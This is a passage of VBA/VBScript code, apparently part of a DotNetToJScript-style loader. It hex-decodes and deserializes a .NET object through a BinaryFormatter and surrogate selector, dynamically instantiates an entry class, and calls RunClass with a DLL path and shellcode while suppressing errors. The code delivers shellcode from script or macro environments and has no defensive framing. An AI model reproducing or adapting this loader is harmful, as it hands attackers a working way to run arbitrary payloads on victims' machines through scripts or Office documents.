    decodedValue = decodeHex(serialized_obj)

    For Each i In decodedValue
        tempmemstream.WriteByte i
    Next i

    tempmemstream.Position = 0

    Dim tempselectorvar As Object, tempdeserializer As Object, tempObject As Object
    Set tempselectorvar = tempformatstring.SurrogateSelector
    Set tempdeserializer = tempformatstring.Deserialize_2(tempmemstream)
    temparraylist.Add tempselectorvar

    Set tempObject = tempdeserializer.DynamicInvoke(temparraylist.ToArray()).CreateInstance(entry_class)
	tempObject.RunClass dllPath, ShellCode
    
    If Err.Number <> 0 Then
      DebugPrint Err.Description
      Err.Clear
    End If
End Function
